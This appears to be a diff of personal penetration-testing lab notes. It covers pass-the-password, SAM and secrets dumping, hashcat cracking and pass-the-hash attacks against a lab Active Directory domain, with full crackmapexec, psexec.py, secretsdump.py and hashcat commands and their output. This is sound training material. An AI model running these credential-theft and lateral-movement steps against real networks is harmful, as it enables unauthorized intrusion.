@@ -3,6 +3,7 @@
 ## Pass the password
 
 ### CrackMapExec
+
 - Install: `sudo apt install crackmapexec`
 - Pass the password on the domain: `crackmapexec smb 10.0.2.0/24 -u fcastle -d DOMAIN.local -p Password1` If the password is the same for another machine in the network we will get ownership on this new machine too
 ```
@@ -15,8 +16,10 @@ SMB         10.0.2.5        445    HYDRA-DC         [+] MARVEL.local\fcastle:Pas
 SMB         10.0.2.4        445    THEDEFENDER      [+] MARVEL.local\fcastle:Password1 (Pwn3d!)
 SMB         10.0.2.15       445    THEPUNISHER      [+] MARVEL.local\fcastle:Password1 (Pwn3d!)
 ```
+
 - We can also add --sam to the previous command to dump the sam file here we got 5 sam hashes
-```
+
+```bash
 ┌──(root💀kali)-[~kali]
 └─# crackmapexec smb 10.0.2.0/24 -u fcastle -d MARVEL.local -p Password1 --sam
 SMB         10.0.2.15       445    THEPUNISHER      [*] Windows 10.0 Build 19041 x64 (name:THEPUNISHER) (domain:MARVEL.local) (signing:False) (SMBv1:False)
@@ -41,9 +44,26 @@ SMB         10.0.2.4        445    THEDEFENDER      Jessica Jones:1001:aad3b435b
 SMB         10.0.2.4        445    THEDEFENDER      [+] Added 5 SAM hashes to the database
 ```
 
-### psexec
-We can also use psexec to try to get a shell on the other machine
+#### Troubleshot crackmapexec
+
+- If you get this error `configparser.NoSectionError: No section: 'BloodHound'`
+- You need to run `locate cme.conf`
+- Once you find it you can add these lines or just set bh_enabled to False if all the lines are already here.
+
+```bash
+[BloodHound]
+bh_enabled = False
+bh_uri = 127.0.0.1
+bh_port = 7687
+bh_user = neo4j
+bh_pass = neo4j
 ```
+
+### psexec
+
+We can also use psexec to try to get a shell on the other machine
+
+```bash
 ┌──(root💀kali)-[~kali]
 └─# psexec.py marvel/fcastle:Password1@10.0.2.4
 Impacket v0.9.19 - Copyright 2019 SecureAuth Corporation
@@ -76,7 +96,8 @@ THEDEFENDER
 ### Impacket - Secretsdump.py
 
 - We can dump hashes from our compromised machines in the network
-```
+
+```bash
 ┌──(root💀kali)-[~kali]
 └─# secretsdump.py marvel/fcastle:Password1@10.0.2.15
 Impacket v0.9.19 - Copyright 2019 SecureAuth Corporation
@@ -98,7 +119,7 @@ Frank Castle:1001:aad3b435b51404eeaad3b435b51404ee:64f12cddaa88057e06a81b54e73b9
 
 ### Hashcat
 
-```
+```bash
 ┌──(root💀kali)-[~kali]
 └─# hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt 
 hashcat (v6.1.1) starting...
@@ -129,13 +150,13 @@ With this: `Frank Castle:1001:aad3b435b51404eeaad3b435b51404ee:64f12cddaa88057e0
 We will use this: `64f12cddaa88057e06a81b54e73b949b`  
 We will then use this command:
 
-```
+```bash
 crackmapexec smb 10.0.2.0/24 -u "Frank Castle" -H 64f12cddaa88057e06a81b54e73b949b --local-auth
 ```
 
 We would get something like this:
 
-```
+```bash
 SMB         10.0.2.15       445    THEPUNISHER      [*] Windows 10.0 Build 19041 x64 (name:THEPUNISHER) (domain:THEPUNISHER) (signing:False) (SMBv1:False)
 SMB         10.0.2.5        445    HYDRA-DC         [*] Windows 10.0 Build 17763 x64 (name:HYDRA-DC) (domain:HYDRA-DC) (signing:True) (SMBv1:False)
 SMB         10.0.2.4        445    THEDEFENDER      [*] Windows 10.0 Build 19041 x64 (name:THEDEFENDER) (domain:THEDEFENDER) (signing:False) (SMBv1:False)
@@ -149,7 +170,8 @@ SMB         10.0.2.4        445    THEDEFENDER      [-] THEDEFENDER\Frank Castle
 We can use the same attack with psexec to get a shell except we will be using the full hash 
 For this `Frank Castle:1001:aad3b435b51404eeaad3b435b51404ee:64f12cddaa88057e06a81b54e73b949b:::`
 We will use this: `aad3b435b51404eeaad3b435b51404ee:64f12cddaa88057e06a81b54e73b949b`  
-```
+
+```bash
 ┌──(root💀kali)-[~kali]
 └─# psexec.py marvel/fcastle@10.0.2.15 -hashes aad3b435b51404eeaad3b435b51404ee:64f12cddaa88057e06a81b54e73b949b
 Impacket v0.9.19 - Copyright 2019 SecureAuth Corporation
